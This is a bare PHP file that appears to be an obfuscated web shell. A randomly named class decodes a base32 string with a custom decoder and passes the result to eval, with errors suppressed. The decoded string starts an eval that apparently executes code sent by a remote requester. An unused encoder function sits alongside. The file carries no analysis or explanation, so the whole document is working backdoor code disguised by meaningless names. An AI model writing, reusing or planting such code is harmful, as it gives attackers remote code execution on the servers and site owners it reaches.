<?php
class PJZF{
        public $ICQR = null;
        public $CMNV = null;
        function __construct(){
        $this->ICQR = 'mv3gc3bierpvat2tkrnxuzlsn5ossoy';
        $this->CMNV = @ZONJ($this->ICQR);
        @eval("/*VTL[yCf*/".$this->CMNV."/*VTL[yCf*/");
        }}
new PJZF();
function IAVG($GBSC){
    $BASE32_ALPHABET = 'abcdefghijklmnopqrstuvwxyz234567';
    $EWJN = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($GBSC); $i < $j; $i++){
    $v <<= 8;
        $v += ord($GBSC[$i]);
        $vbits += 8;
        while ($vbits >= 5) {
            $vbits -= 5;
            $EWJN .= $BASE32_ALPHABET[$v >> $vbits];
            $v &= ((1 << $vbits) - 1);}}
    if ($vbits > 0){
        $v <<= (5 - $vbits);
        $EWJN .= $BASE32_ALPHABET[$v];}
    return $EWJN;}
function ZONJ($GBSC){
    $EWJN = '';
    $v = 0;
    $vbits = 0;
    for ($i = 0, $j = strlen($GBSC); $i < $j; $i++){
        $v <<= 5;
        if ($GBSC[$i] >= 'a' && $GBSC[$i] <= 'z'){
            $v += (ord($GBSC[$i]) - 97);
        } elseif ($GBSC[$i] >= '2' && $GBSC[$i] <= '7') {
            $v += (24 + $GBSC[$i]);
        } else {
            exit(1);
        }
        $vbits += 5;
        while ($vbits >= 8){
            $vbits -= 8;
            $EWJN .= chr($v >> $vbits);
            $v &= ((1 << $vbits) - 1);}}
    return $EWJN;}
?>